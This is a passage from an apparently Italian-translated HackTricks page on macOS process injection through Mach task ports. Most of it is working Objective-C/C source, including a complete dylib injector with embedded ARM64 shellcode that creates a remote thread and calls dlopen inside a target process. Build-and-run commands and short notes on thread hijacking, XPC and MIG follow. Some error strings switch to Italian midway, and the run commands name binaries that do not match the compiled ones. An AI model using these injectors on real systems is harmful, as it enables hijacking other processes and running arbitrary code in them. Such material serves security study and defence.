fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</dettagli>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Iniezione di Dylib nel thread tramite porta Task

In macOS i **thread** possono essere manipolati tramite **Mach** o utilizzando **l'API posix `pthread`**. Il thread generato nell'iniezione precedente è stato generato utilizzando l'API Mach, quindi **non è conforme a posix**.

È stato possibile **iniettare un semplice shellcode** per eseguire un comando perché **non era necessario lavorare con le API conformi a posix**, solo con Mach. **Iniezioni più complesse** avrebbero bisogno che il **thread** sia anche **conforme a posix**.

Pertanto, per **migliorare il thread**, dovrebbe chiamare **`pthread_create_from_mach_thread`** che creerà un pthread valido. Quindi, questo nuovo pthread potrebbe **chiamare dlopen** per **caricare una dylib** dal sistema, quindi anziché scrivere nuovo shellcode per eseguire azioni diverse, è possibile caricare librerie personalizzate.

Puoi trovare **esempi di dylibs** in (ad esempio quello che genera un log e poi puoi ascoltarlo):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Impossibile impostare i permessi di memoria per il codice del thread remoto: Errore %s\n", mach_error_string(kr));
return (-4);
}

// Imposta i permessi sulla memoria dello stack allocata
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Impossibile impostare i permessi di memoria per lo stack del thread remoto: Errore %s\n", mach_error_string(kr));
return (-4);
}


// Crea un thread per eseguire lo shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // questo è lo stack reale
//remoteStack64 -= 8;  // necessario allineamento di 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Stack remoto 64  0x%llx, Il codice remoto è %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Impossibile creare un thread remoto: errore %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Utilizzo: %s _pid_ _azione_\n", argv[0]);
fprintf (stderr, "   _azione_: percorso di un dylib su disco\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *azione = argv[2];
struct stat buf;

int rc = stat (azione, &buf);
if (rc == 0) inject(pid,azione);
else
{
fprintf(stderr,"Dylib non trovato\n");
}

}
```
</dettagli>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Dirottamento del thread tramite la porta Task <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In questa tecnica viene dirottato un thread del processo:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Informazioni di base

XPC, che sta per XNU (il kernel utilizzato da macOS) Inter-Process Communication, è un framework per la **comunicazione tra processi** su macOS e iOS. XPC fornisce un meccanismo per effettuare **chiamate di metodo sicure e asincrone tra processi diversi** sul sistema. Fa parte del paradigma di sicurezza di Apple, consentendo la **creazione di applicazioni con privilegi separati** in cui ogni **componente** viene eseguito con **solo i permessi necessari** per svolgere il proprio lavoro, limitando così i danni potenziali da un processo compromesso.

Per ulteriori informazioni su come questa **comunicazione funziona** e su come **potrebbe essere vulnerabile**, controlla:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG è stato creato per **semplificare il processo di creazione del codice Mach IPC**. Ciò perché gran parte del lavoro per programmare RPC coinvolge le stesse azioni (imballaggio degli argomenti, invio del messaggio, disimballaggio dei dati nel server...).

MIC genera **il codice necessario** per far comunicare server e client con una definizione data (in IDL -Linguaggio di Definizione dell'Interfaccia-). Anche se il codice generato è brutto, uno sviluppatore dovrà solo importarlo e il suo codice sarà molto più semplice rispetto a prima.

Per ulteriori informazioni, controlla:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Riferimenti

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
